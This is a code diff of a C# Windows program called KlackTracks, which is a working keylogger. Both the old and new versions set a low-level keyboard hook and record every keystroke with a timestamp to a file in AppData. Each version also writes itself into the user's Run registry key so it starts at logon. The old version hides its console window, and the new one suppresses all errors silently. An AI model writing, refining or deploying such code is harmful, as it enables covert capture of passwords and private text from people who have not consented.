@@ -1,78 +1,72 @@
 ﻿using System;
-using System.Diagnostics;
+using Microsoft.Win32;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
-using System.IO;
-using Microsoft.Win32;
+using Process = System.Diagnostics.Process;
+using StreamWriter = System.IO.StreamWriter;
 
-public class KlackTracks {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int SW_HIDE = 0;
-    private static LowLevelKeyboardProc _proc = HookCallback;
-    private static IntPtr _hookID = IntPtr.Zero;
-    private static RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+namespace KlackTracks {
+    class KlackTracks {
+        // A reference to this project's settings file.
+        private static readonly Properties.Settings settings = Properties.Settings.Default;
+        // The full path of the file being logged to.
+        private static readonly string logPath = 
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + settings.LogFile;
+        // The stream data will be written to. Log file is created if it doesn't exist.
+        private static readonly StreamWriter logStream = new StreamWriter(logPath, true) { AutoFlush = true };
+        // A delegate representing the hook procedure method.
+        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+        // Constants required for hook procedures.
+        private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100;
 
-    private static readonly string AppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-    private const string LogFile = "\\keylog.txt";
-
-    private static StreamWriter logStream = null;
-
-    public static void Main() {
-        var handle = GetConsoleWindow();
-        // add to the registry so this program starts at system startup
-        if (regKey.GetValue("KlackTracks") == null) {
-            regKey.SetValue("KlackTracks", Application.ExecutablePath.ToString());
-        }
-        
-        // Hide the console window
-        ShowWindow(handle, SW_HIDE);
-
-        _hookID = SetHook(_proc);
-        Application.Run();
-
-        UnhookWindowsHookEx(_hookID);
-    }
-
-    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-
-    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-            if (logStream == null) {
-                logStream = File.Exists(AppDataPath + LogFile) ?
-                new StreamWriter(AppDataPath + LogFile, true) : File.CreateText(AppDataPath + LogFile);
+        static void Main() {
+            var hookId = IntPtr.Zero;
+            try {
+                // Add this program to the startup list, overwriting any previous values present.
+                Registry.CurrentUser.OpenSubKey(settings.StartupKey, true)
+                    .SetValue(settings.AppName, Application.ExecutablePath);
+                // Set up the hook.
+                hookId = SetHook(HookCallback);
+                // Start the message loop. Program won't execute past this point if all goes well.
+                Application.Run();
+                // Reference callback so the garbage collector doesn't swallow it.
+                GC.KeepAlive(new HookProc(HookCallback));
+            } catch {
+                // Die quietly. No need to make a fuss.
+            } finally {
+                if (hookId != IntPtr.Zero) {
+                    UnhookWindowsHookEx(hookId);
+                }
             }
-            int vkCode = Marshal.ReadInt32(lParam);
-            logStream.WriteLine(DateTime.UtcNow.Ticks + " " + ((Keys)vkCode).ToString());
-            logStream.Flush();
         }
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+
+        private static IntPtr SetHook(HookProc proc) {
+            using (var currentProcess = Process.GetCurrentProcess())
+            using (var currentModule = currentProcess.MainModule) {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
+            }
+        }
+
+        private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
+            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                var keyCode = (Keys)Marshal.ReadInt32(lParam);
+                logStream.WriteLine(DateTime.UtcNow.Ticks + " " + keyCode.ToString());
+                logStream.Flush();
+            }
+            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
+        }
+
+        // Installs an application-defined hook procedure into a hook chain.
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+        // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
+        [DllImport("user32.dll")]
+        private static extern int UnhookWindowsHookEx(IntPtr hhk);
+        // Passes the hook information to the next hook procedure in the current hook chain.
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        // Retrieves a module handle for the specified module.
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
     }
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
